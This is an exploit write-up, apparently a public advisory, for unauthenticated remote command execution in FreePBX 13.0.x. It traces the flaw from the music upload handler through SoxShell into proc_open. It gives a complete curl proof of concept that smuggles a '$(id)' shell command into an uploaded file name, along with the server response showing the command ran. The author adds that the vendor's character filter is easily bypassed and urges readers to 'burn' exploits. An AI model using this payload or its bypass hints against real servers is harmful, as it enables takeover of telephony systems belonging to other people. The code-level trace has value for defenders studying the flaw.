Tested versions : 13.0.x < 13.0.154
vendor : freepbx.org
Author : i-Hmx
Email : n0p1337@gmail.com
Home : sec4ever.com
 
Knock knock people , Eg-R1z on the mic again . .
Freepbx is vulnerable to unauthenticated remote command execution due to multiple weak inputs validation as well as partial authenticaion bypass
Need more technical shit?!
Here u go
 
File : /var/www/html/admin/libraries/Composer/vendor/symfony/process/Symfony/Component/Process/Process.php
class Process
{
    const ERR = &#039;err&#039;;
    const OUT = &#039;out&#039;;
 
    const STATUS_READY = &#039;ready&#039;;
    const STATUS_STARTED = &#039;started&#039;;
    const STATUS_TERMINATED = &#039;terminated&#039;;
 
Line 145:
       public function __construct($commandline, $cwd = null, array $env = null, $input = null, $timeout = 60, array $options = array())
    {
        if (!function_exists(&#039;proc_open&#039;)) {
            throw new RuntimeException(&#039;The Process class relies on proc_open, which is not available on your PHP installation.&#039;);
        }
 
        --===>>> $this->commandline = $commandline;
        $this->cwd = $cwd;
 
    
Line 275
        $commandline = $this->commandline;
 
        if (&#039;\\&#039; === DIRECTORY_SEPARATOR && $this->enhanceWindowsCompatibility) {
            $commandline = &#039;cmd /V:ON /E:ON /C "(&#039;.$commandline.&#039;)&#039;;
            foreach ($this->processPipes->getFiles() as $offset => $filename) {
                $commandline .= &#039; &#039;.$offset.&#039;>&#039;.ProcessUtils::escapeArgument($filename);
            }
            $commandline .= &#039;"&#039;;
 
            if (!isset($this->options[&#039;bypass_shell&#039;])) {
                $this->options[&#039;bypass_shell&#039;] = true;
            }
        }
 
        --===>>> $this->process = proc_open($commandline, $descriptors, $this->processPipes->pipes, $this->cwd, $this->env, $this->options);
 
Class is being called at
 
File : /var/www/html/admin/libraries/media/Media/Driver/Drivers/SoxShell.php
Line 118
    public function convert($newFilename,$extension,$mime) {
        switch($extension) {
            case "wav":
                switch($this->extension) {
                    case "sln":
                        $process = new Process($this->binary.&#039; -t raw -s -b 16 -r 8000 &#039;.$this->track.&#039; -r &#039;.$this->options[&#039;samplerate&#039;].&#039; -b &#039;.$this->options[&#039;bitdepth&#039;].&#039; -c 1 &#039;.$newFilename);
                    break;
                    case "sln12":
                        $process = new Proces.................
        case "wav16":
                ---===>> $process = new Process($this->binary.&#039; &#039;.$this->track.&#039; -t wav -b 16 -r 16000 -c 1 &#039;.$newFilename);
            break;
            default:
                $process = new Process($this->binary.&#039; &#039;.$this->track.&#039; -c 1 &#039;.$newFilename);
            break;
        }
        if(!$this->background) {
            ---===>> $process->run();
            if (!$process->isSuccessful()) {
                throw new \RuntimeException($process->getErrorOutput());
            }
        } else {
            $process->start();
            if (!$process->isRunning()) {
                throw new \RuntimeException($process->getErrorOutput());
            }
        }
    }
 
Sox shell can be called via multiple parts of the fpbx including the music module
File : admin/modules/music/Music.class.php
Line : 407
                                $name = $dname . &#039;.&#039; . $extension;
                                move_uploaded_file($tmp_name, $this->tmp."/".$name);
                                $media->load($this->tmp."/".$name);
                                foreach($_POST[&#039;codec&#039;] as $c) {
                            --==>> $media->convert($path."/".$dname.".".$c);
                                }
                                unlink($this->tmp."/".$name);
 
this part can be accessed by unauthenticated user and so it&#039;s obvious command execution vulnerable :/
 
POC :
[root:/lab/fpbx]# curl -i -s -k  -X &#039;POST&#039; \
    -H &#039;User-Agent: sec4ever 1337s&#039; -H &#039;Referer: http://x.x.x.x/admin/ajax.php&#039; -H &#039;Content-Type: multipart/form-data; boundary=---------------------------317092200613369&#039; \
    --data-binary $&#039;-----------------------------317092200613369\x0d\x0aContent-Disposition: form-data; name=\"extension\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------317092200613369\x0d\x0aContent-Disposition: form-data; name=\"language\"\x0d\x0a\x0d\x0aen\x0d\x0a-----------------------------317092200613369\x0d\x0aContent-Disposition: form-data; name=\"filename\"\x0d\x0a\x0d\x0afa.wav\x0d\x0a-----------------------------317092200613369\x0d\x0aContent-Disposition: form-data; name=\"codec[1]\"\x0d\x0a\x0d\x0agsm\x0d\x0a-----------------------------317092200613369\x0d\x0aContent-Disposition: form-data; name=\"id\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------317092200613369\x0d\x0aContent-Disposition: form-data; name=\"files[1]\"; filename=\"$(id).wav\"\x0d\x0aContent-Type: text/plain\x0d\x0a\x0d\x0aEg-R1z ruling you ;)\x0d\x0a-----------------------------317092200613369\x0d\x0a\x0d\x0a&#039; \
    &#039;http://x.x.x.x/admin/ajax.php?module=music&command=upload&#039;
HTTP/1.1 500 Internal Server Error
Date: Wed, 07 Sep 2016 17:33:02 GMT
Server: Apache/2.2.15 (CentOS)
X-Powered-By: PHP/5.3.28
Set-Cookie: lang=en_US
Set-Cookie: PHPSESSID=6j9ei3pn1btu2o6jc1j6mngmp4; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Pragma: no-cache
X-Ignore-This: 1
Connection: close
Transfer-Encoding: chunked
Content-Type: application/json
 
{"error":{"type":"RuntimeException","message":"\/usr\/bin\/sox formats: can&#039;t open input file `groups=498(asterisk).wav&#039;: No such file or directory\n","file":"\/var\/www\/html\/admin\/libraries\/media\/Media\/Driver\/Drivers\/SoxShell.php","line":194}}#                   
 
Patching : can be done via adding escapeshellarg to soxshell inputs
Almost fixed in fpbx later versions
# in this version spaces,&#039;,`,/,\,<,>,?,&,| are filtered , which can be super easily bypassed
# make a priv8 , burn another ;)
# From Eg-R1z with Love xD

